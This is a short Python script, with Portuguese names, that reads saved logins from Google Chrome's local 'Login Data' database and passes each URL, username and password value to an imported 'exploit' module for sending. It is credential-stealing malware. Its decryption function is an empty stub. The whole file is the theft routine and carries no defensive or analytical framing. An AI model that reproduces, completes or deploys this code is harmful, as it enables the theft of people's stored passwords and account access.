import sqlite3,os,exploit

def Conexao():
    db = '%s/Google/Chrome/User Data/Default/Login Data' % os.environ['LocalAppData']
    try:
        conn = sqlite3.connect(db)
        return conn
    except sqlite3.Error as e:
        print('ERROR %s' % e)

def Dump():
    conexao = Conexao()
    cursor = conexao.cursor()
    chrome = cursor.execute('select origin_url,username_value,password_value from logins')
    return chrome

def Descriptografar():
    pass

browser = Dump()

for url,user,pwd in browser:
    registro = '\nurl: '+url+'\nuser: '+user+'\nsenha: '+str(pwd)
    cliente = exploit.exploit()
    cliente.enviar(registro)
    